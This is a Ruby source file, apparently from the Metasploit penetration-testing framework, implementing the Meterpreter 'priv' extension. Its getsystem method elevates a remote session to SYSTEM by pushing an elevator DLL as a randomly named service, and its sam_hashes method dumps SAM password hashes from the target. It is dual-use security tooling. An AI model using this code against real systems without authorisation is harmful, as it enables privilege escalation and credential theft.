# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/priv/tlv'
require 'rex/post/meterpreter/extensions/priv/passwd'
require 'rex/post/meterpreter/extensions/priv/fs'

module Rex
module Post
module Meterpreter
module Extensions
module Priv

###
#
# This meterpreter extensions a privilege escalation interface that is capable
# of doing things like dumping password hashes and performing local
# exploitation.
#
###
class Priv < Extension

  #
  # Initializes the privilege escalationextension.
  #
  def initialize(client)
    super(client, 'priv')

    client.register_extension_aliases(
      [
        {
          'name' => 'priv',
          'ext'  => self
        },
      ])

    # Initialize sub-classes
    self.fs = Fs.new(client)
  end

  #
  # Attempt to elevate the meterpreter to Local SYSTEM
  #
  def getsystem( technique=0 )
    request = Packet.create_request( 'priv_elevate_getsystem' )

    elevator_name = Rex::Text.rand_text_alpha_lower( 6 )

    elevator_path = ::File.join( Msf::Config.data_directory, "meterpreter", "elevator.#{client.binary_suffix}" )

    elevator_path = ::File.expand_path( elevator_path )

    elevator_data = ""

    ::File.open( elevator_path, "rb" ) { |f|
      elevator_data += f.read( f.stat.size )
    }

    request.add_tlv( TLV_TYPE_ELEVATE_TECHNIQUE, technique )
    request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_NAME, elevator_name )
    request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_DLL, elevator_data )
    request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_LENGTH, elevator_data.length )

    # as some service routines can be slow we bump up the timeout to 90 seconds
    response = client.send_request( request, 90 )

    technique = response.get_tlv_value( TLV_TYPE_ELEVATE_TECHNIQUE )

    if( response.result == 0 and technique != nil )
      client.core.use( "stdapi" ) if not client.ext.aliases.include?( "stdapi" )
      client.sys.config.getprivs
      if client.framework.db and client.framework.db.active
        client.framework.db.report_note(
          :host => client.sock.peerhost,
          :workspace => client.framework.db.workspace,
          :type => "meterpreter.getsystem",
          :data => {:technique => technique}
        ) rescue nil
      end
      return [ true, technique ]
    end

    return [ false, 0 ]
  end

  #
  # Returns an array of SAM hashes from the remote machine.
  #
  def sam_hashes
    # This can take a long long time for large domain controls, bump the timeout to one hour
    response = client.send_request(Packet.create_request('priv_passwd_get_sam_hashes'), 3600)

    response.get_tlv_value(TLV_TYPE_SAM_HASHES).split(/\n/).map { |hash|
      SamUser.new(hash)
    }
  end

  #
  # Modifying privileged file system attributes.
  #
  attr_reader :fs

protected

  attr_writer :fs # :nodoc:

end

end; end; end; end; end

